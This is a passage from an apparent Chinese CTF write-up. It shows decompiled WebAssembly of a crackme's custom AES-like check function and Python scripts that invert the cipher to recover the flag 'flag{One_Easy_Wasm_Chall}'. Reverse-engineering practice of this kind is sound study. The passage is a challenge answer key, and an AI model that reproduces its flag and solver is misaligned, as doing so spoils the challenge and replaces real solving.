class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[r])]</span><br><span class="line">            state = inv_mix_columns(state)</span><br><span class="line">            state = inv_shift_rows(state)</span><br><span class="line">            state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        state = [b ^ k <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[<span class="number">0</span>])]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6. 分两块解密并合并</span></span><br><span class="line">    block1 = decrypt_block(full_ciphertext[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">    block2 = decrypt_block(full_ciphertext[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line">    </span><br><span class="line">    full_flag = block1 + block2</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 移除 PKCS#7 填充 (填充字节的值等于填充的长度)</span></span><br><span class="line">    padding_len = full_flag[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt; padding_len &lt;= <span class="number">16</span>:</span><br><span class="line">        <span class="comment"># 简单检查是否真的是填充</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(b == padding_len <span class="keyword">for</span> b <span class="keyword">in</span> full_flag[-padding_len:]):</span><br><span class="line">            full_flag = full_flag[:-padding_len]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, full_flag.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>
<p>还是干点人事吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm-decompile challenge.wasm -o challenge.dcmp</span><br></pre></td></tr></table></figure>
<p>这一步可以试着反编译为高级代码，可以直接notepad打开，勉强可读</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">export memory memory(initial: 258, max: 258);</span><br><span class="line"></span><br><span class="line">global g_a:int = 66880;</span><br><span class="line"></span><br><span class="line">export table indirect_function_table:funcref(min: 2, max: 2);</span><br><span class="line"></span><br><span class="line">data d_XK6T9Jc915jqlenkOyB_HSvA4asu(offset: 1024) =</span><br><span class="line">  &quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f&quot;</span><br><span class="line">  &quot;\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(&quot;</span><br><span class="line">  &quot;\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S&quot;</span><br><span class="line">  &quot;\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95&quot;</span><br><span class="line">  &quot;\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&quot;</span><br><span class="line">  &quot;&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2&quot;</span><br><span class="line">  &quot;N\84\04Q\81\bah`P\13\~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae&quot;</span><br><span class="line">  &quot;\b0? \f4R\e0&quot;\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc&quot;</span><br><span class="line">  &quot;\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b&quot;</span><br><span class="line">  &quot;\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91&quot;</span><br><span class="line">  &quot;\0a\9b\00\fb\0f\8d$w&quot;;</span><br><span class="line"></span><br><span class="line">export function initialize() &#123;</span><br><span class="line">  nop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function check(a:int, b:int):int &#123;</span><br><span class="line">  var d:int;</span><br><span class="line">  var f:int;</span><br><span class="line">  var c:int;</span><br><span class="line">  var h:int = g_a - 144;</span><br><span class="line">  g_a = h;</span><br><span class="line">  if (b &gt; 48) goto B_a;</span><br><span class="line">  var i:int = h + 128;</span><br><span class="line">  loop L_b &#123;</span><br><span class="line">    if (d != 8) &#123;</span><br><span class="line">      (d + i)[0]:byte =</span><br><span class="line">        f_c((d + 1024)[0]:ubyte, (d + 1040)[0]:ubyte, d &amp; 255);</span><br><span class="line">      d = d + 1;</span><br><span class="line">      continue L_b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  d = 8;</span><br><span class="line">  loop L_d &#123;</span><br><span class="line">    if (d != 16) &#123;</span><br><span class="line">      (d + i)[0]:byte =</span><br><span class="line">        f_c((d + 1024)[0]:ubyte, (d + 1040)[0]:ubyte, d &amp; 255);</span><br><span class="line">      d = d + 1;</span><br><span class="line">      continue L_d;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  var j:int = h - -64;</span><br><span class="line">  var e:int = (b &amp; 48) + 16;</span><br><span class="line">  loop L_f &#123;</span><br><span class="line">    if (b == f) &#123;</span><br><span class="line">      d = select_if(e, b, b &lt; e);</span><br><span class="line">      a = e - b;</span><br><span class="line">      loop L_i &#123;</span><br><span class="line">        if (b == d) goto B_h;</span><br><span class="line">        (b + j)[0]:byte = a;</span><br><span class="line">        b = b + 1;</span><br><span class="line">        continue L_i;</span><br><span class="line">      &#125;</span><br><span class="line">      unreachable;</span><br><span class="line">      label B_h:</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      (f + j)[0]:byte = (a + f)[0]:ubyte;</span><br><span class="line">      f = f + 1;</span><br><span class="line">      continue L_f;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if (e != 32) goto B_a;</span><br><span class="line">  b = 0;</span><br><span class="line">  loop L_j &#123;</span><br><span class="line">    if (b &lt; 32) &#123;</span><br><span class="line">      c = b + j;</span><br><span class="line">      var k:int = b + h;</span><br><span class="line">      a = 0;</span><br><span class="line">      var g:int = g_a - 192;</span><br><span class="line">      g_a = g;</span><br><span class="line">      loop L_l &#123;</span><br><span class="line">        if (a == 16) &#123;</span><br><span class="line">          a = 0;</span><br><span class="line">          loop L_n &#123;</span><br><span class="line">            if (a == 16) &#123;</span><br><span class="line">              var l:int = g - 16;</span><br><span class="line">              f = 1;</span><br><span class="line">              loop L_q &#123;</span><br><span class="line">                if (f == 11) goto B_p;</span><br><span class="line">                e = f * 17;</span><br><span class="line">                a = 0;</span><br><span class="line">                c = l + (d = f &lt;&lt; 4);</span><br><span class="line">                loop L_r &#123;</span><br><span class="line">                  if (a == 16) &#123;</span><br><span class="line">                    f = f + 1;</span><br><span class="line">                    continue L_q;</span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                    (d + g + a)[0]:byte = (e ^ (a + c)[0]:ubyte) ^ a;</span><br><span class="line">                    a = a + 1;</span><br><span class="line">                    continue L_r;</span><br><span class="line">                  &#125;</span><br><span class="line">                  unreachable;</span><br><span class="line">                &#125;</span><br><span class="line">                unreachable;</span><br><span class="line">              &#125;</span><br><span class="line">              unreachable;</span><br><span class="line">              label B_p:</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              (a + g)[0]:byte = (a + i)[0]:ubyte;</span><br><span class="line">              a = a + 1;</span><br><span class="line">              continue L_n;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          f_d(g + 176, g);</span><br><span class="line">          a = 1;</span><br><span class="line">          loop L_t &#123;</span><br><span class="line">            if (a == 11) &#123;</span><br><span class="line">              a = 0;</span><br><span class="line">              loop L_w &#123;</span><br><span class="line">                if (a == 16) goto B_v;</span><br><span class="line">                (a + k)[0]:byte = (g + 176 + a)[0]:ubyte;</span><br><span class="line">                a = a + 1;</span><br><span class="line">                continue L_w;</span><br><span class="line">              &#125;</span><br><span class="line">              unreachable;</span><br><span class="line">              label B_v:</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">              c = g + 176;</span><br><span class="line">              e = 0;</span><br><span class="line">              loop L_x &#123;</span><br><span class="line">                if (e != 16) &#123;</span><br><span class="line">                  d = c + e;</span><br><span class="line">                  d[0]:byte = (d[0]:ubyte + 1056)[0]:ubyte;</span><br><span class="line">                  e = e + 1;</span><br><span class="line">                  continue L_x;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              e = c[1]:ubyte;</span><br><span class="line">              c[1]:byte = c[5]:ubyte;</span><br><span class="line">              d = c[9]:ubyte;</span><br><span class="line">              c[9]:byte = c[13]:ubyte;</span><br><span class="line">              c[5]:byte = d;</span><br><span class="line">              c[13]:byte = e;</span><br><span class="line">              d = c[2]:ubyte;</span><br><span class="line">              c[2]:byte = c[10]:ubyte;</span><br><span class="line">              c[10]:byte = d;</span><br><span class="line">              d = c[6]:ubyte;</span><br><span class="line">              c[6]:byte = c[14]:ubyte;</span><br><span class="line">              c[14]:byte = d;</span><br><span class="line">              d = c[15]:ubyte;</span><br><span class="line">              c[15]:byte = c[11]:ubyte;</span><br><span class="line">              c[11]:byte = c[7]:ubyte;</span><br><span class="line">              c[7]:byte = c[3]:ubyte;</span><br><span class="line">              c[3]:byte = d;</span><br><span class="line">              if (a != 10) &#123;</span><br><span class="line">                f_e(c);</span><br><span class="line">                f_e(c + 4);</span><br><span class="line">                f_e(c + 8);</span><br><span class="line">                f_e(c + 12);</span><br><span class="line">              &#125;</span><br><span class="line">              f_d(c, g + (a &lt;&lt; 4));</span><br><span class="line">              a = a + 1;</span><br><span class="line">              continue L_t;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          g_a = g + 192;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          (g + 176 + a)[0]:byte = (a + c)[0]:ubyte;</span><br><span class="line">          a = a + 1;</span><br><span class="line">          continue L_l;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      b = b + 16;</span><br><span class="line">      continue L_j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  b = 0;</span><br><span class="line">  loop L_aa &#123;</span><br><span class="line">    a = b;</span><br><span class="line">    if (a != 32) &#123;</span><br><span class="line">      b = a + 1;</span><br><span class="line">      if ((a + h)[0]:ubyte == (a + 1312)[0]:ubyte) continue L_aa;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  c = a &gt; 31;</span><br><span class="line">  label B_a:</span><br><span class="line">  g_a = h + 144;</span><br><span class="line">  return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_c(a:int, b:int, c:int):int &#123;</span><br><span class="line">  return c * -23 + (a ^ b) &amp; 255</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_d(a:int, b:int) &#123;</span><br><span class="line">  var c:int;</span><br><span class="line">  loop L_a &#123;</span><br><span class="line">    if (c != 16) &#123;</span><br><span class="line">      var d:int = a + c;</span><br><span class="line">      d[0]:byte = d[0]:ubyte ^ (b + c)[0]:ubyte;</span><br><span class="line">      c = c + 1;</span><br><span class="line">      continue L_a;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_e(a:int) &#123;</span><br><span class="line">  var c:int;</span><br><span class="line">  var d:int;</span><br><span class="line">  var e:int;</span><br><span class="line">  var f:int;</span><br><span class="line">  var g:int;</span><br><span class="line">  var b:int;</span><br><span class="line">  var h:int;</span><br><span class="line">  a[0]:byte =</span><br><span class="line">    (f_f(e = (c = a[1]:ubyte) ^ (d = a[0]:ubyte)) ^ d) ^</span><br><span class="line">    (h = (g = (f = a[2]:ubyte) ^ e) ^ (b = a[3]:ubyte));</span><br><span class="line">  a[1]:byte = (f_f(c ^ f) ^ c) ^ h;</span><br><span class="line">  a[2]:byte = (f_f(b ^ f) ^ b) ^ e;</span><br><span class="line">  a[3]:byte = f_f(b ^ d) ^ g;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f_f(a:int):int &#123;</span><br><span class="line">  return ((i32_extend8_s(a) &gt;&gt; 7 &amp; 27) ^ a &lt;&lt; 1) &amp; 255</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function emscripten_stack_restore(a:int) &#123;</span><br><span class="line">  g_a = a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export function emscripten_stack_get_current():int &#123;</span><br><span class="line">  return g_a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251225230436279.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 原始数据段 (从 1024 开始)</span></span><br><span class="line">    <span class="comment"># 根据伪代码，我们需要提取 key1, key2, sbox 和 target</span></span><br><span class="line">    raw_data = <span class="string">r&quot;\80\80XK\c6\16^\90\95\b56\aa^T\fe\9a\ab\cd\179^\82\f1Jc\b7,\90\d5\08\7f\e69&amp;-!\a815\9fj[=q\a4\8d\f1,\90\d8\93&#x27;\a0\03\1d\aa\f7\8e\f8\f5\c6\fe(\9a\ed\a7\c9|le\ad\96n\ff\bf\ab+\82kO^\9dy\99B\cc_\c0]H\da\b8\b1&#125;\e8/S\d9v@A4\00\fa\08a\8c\e9s\b9u\de\09\8bZ\b7z\a6\eb\010\91\e4c\10\16\02\95\8a\b5\f0\a1\19\17i\df\1f\a3X%\0af\c5\f2\0b\f9\1a\d5\c8\c7b\af\e6\ec\80&#123;J\a5\a9\88\97VI\b6\05\cd\1eM\9e\fd$g&gt;\07C):\db\15\86xp\ca\d2\1c\b4\e2N\84\04Q\81\bah`P\13\~\06\98\89\f68\cb\cf\be#\bd\92m7\d7\8f\14\f36\0c\ae\b0? \f4R\e0\22\7ftF\fc\ee\9c\b2\87.E\11\e7\d1\d0*d\ef&lt;\12Y\acT;o\0d\e3\dc\9bG\c4\bb\a2\c2K3\83\d4\ce\c1D\dd\b3\94\0fr\85\d6\fb\d3W\e5\bc\182\1b\c3wU\ea\0e\e1L\96&lt;\d1s/\ac\fe\c2\00V\e1&amp;4\9a\e1/\b5O\a3\86\fb\87\f8\91\0a\9b\00\fb\0f\8d$w&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_wat</span>(<span class="params">s</span>):</span><br><span class="line">        res = <span class="built_in">bytearray</span>()</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(s):</span><br><span class="line">            <span class="keyword">if</span> s[i] == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">and</span> i+<span class="number">2</span> &lt; <span class="built_in">len</span>(s) <span class="keyword">and</span> s[i+<span class="number">1</span>:i+<span class="number">3</span>].isalnum():</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res.append(<span class="built_in">int</span>(s[i+<span class="number">1</span>:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">                    i += <span class="number">3</span></span><br><span class="line">                <span class="keyword">except</span>: res.append(<span class="built_in">ord</span>(s[i])); i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(<span class="built_in">ord</span>(s[i]))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    blob = parse_wat(raw_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 生成 Round Key 0 (f_c)</span></span><br><span class="line">    rk0 = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        rk0[i] = (i * -<span class="number">23</span> + (blob[i] ^ blob[i+<span class="number">16</span>])) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 迭代生成 11 轮密钥</span></span><br><span class="line">    round_keys = [rk0]</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        prev = round_keys[-<span class="number">1</span>]</span><br><span class="line">        curr = <span class="built_in">bytearray</span>([(prev[i] ^ (r * <span class="number">17</span>) ^ i) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])</span><br><span class="line">        round_keys.append(curr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 提取 S 盒和目标密文</span></span><br><span class="line">    sbox = blob[<span class="number">32</span>:<span class="number">288</span>]</span><br><span class="line">    rsbox = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox): rsbox[v] = i</span><br><span class="line">    </span><br><span class="line">    target = blob[<span class="number">288</span>:<span class="number">320</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. AES 逆向组件</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">s</span>):</span><br><span class="line">        <span class="keyword">return</span> [s[<span class="number">0</span>], s[<span class="number">13</span>], s[<span class="number">10</span>], s[<span class="number">7</span>], s[<span class="number">4</span>], s[<span class="number">1</span>], s[<span class="number">14</span>], s[<span class="number">11</span>], s[<span class="number">8</span>], s[<span class="number">5</span>], s[<span class="number">2</span>], s[<span class="number">15</span>], s[<span class="number">12</span>], s[<span class="number">9</span>], s[<span class="number">6</span>], s[<span class="number">3</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">return</span> ((x &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span> <span class="keyword">if</span> (x &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (x &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (y &gt;&gt; i) &amp; <span class="number">1</span>: res ^= x</span><br><span class="line">            x = xtime(x)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inv_mix_cols</span>(<span class="params">s</span>):</span><br><span class="line">        ns = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">            c = s[i:i+<span class="number">4</span>]</span><br><span class="line">            ns[i+<span class="number">0</span>] = mul(c[<span class="number">0</span>], <span class="number">14</span>) ^ mul(c[<span class="number">1</span>], <span class="number">11</span>) ^ mul(c[<span class="number">2</span>], <span class="number">13</span>) ^ mul(c[<span class="number">3</span>], <span class="number">9</span>)</span><br><span class="line">            ns[i+<span class="number">1</span>] = mul(c[<span class="number">0</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">1</span>], <span class="number">14</span>) ^ mul(c[<span class="number">2</span>], <span class="number">11</span>) ^ mul(c[<span class="number">3</span>], <span class="number">13</span>)</span><br><span class="line">            ns[i+<span class="number">2</span>] = mul(c[<span class="number">0</span>], <span class="number">13</span>) ^ mul(c[<span class="number">1</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">2</span>], <span class="number">14</span>) ^ mul(c[<span class="number">3</span>], <span class="number">11</span>)</span><br><span class="line">            ns[i+<span class="number">3</span>] = mul(c[<span class="number">0</span>], <span class="number">11</span>) ^ mul(c[<span class="number">1</span>], <span class="number">13</span>) ^ mul(c[<span class="number">2</span>], <span class="number">9</span>)  ^ mul(c[<span class="number">3</span>], <span class="number">14</span>)</span><br><span class="line">        <span class="keyword">return</span> ns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block</span>):</span><br><span class="line">        state = [(b ^ k) <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(block, round_keys[<span class="number">10</span>])]</span><br><span class="line">        state = inv_shift_rows(state)</span><br><span class="line">        state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = [(b ^ k) <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[r])]</span><br><span class="line">            state = inv_mix_cols(state)</span><br><span class="line">            state = inv_shift_rows(state)</span><br><span class="line">            state = [rsbox[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line">        state = [(b ^ k) <span class="keyword">for</span> b, k <span class="keyword">in</span> <span class="built_in">zip</span>(state, round_keys[<span class="number">0</span>])]</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密两个分组</span></span><br><span class="line">    res1 = decrypt_block(target[:<span class="number">16</span>])</span><br><span class="line">    res2 = decrypt_block(target[<span class="number">16</span>:])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, (res1 + res2).decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure>
<p><strong>flag{One_Easy_Wasm_Chall}</strong></p>
<ul>
<li>JN</li>
</ul>
<blockquote>
<p>Why can’t some functions be seen</p>
</blockquote>
<p>jadx打开出现了报错信息：</p>
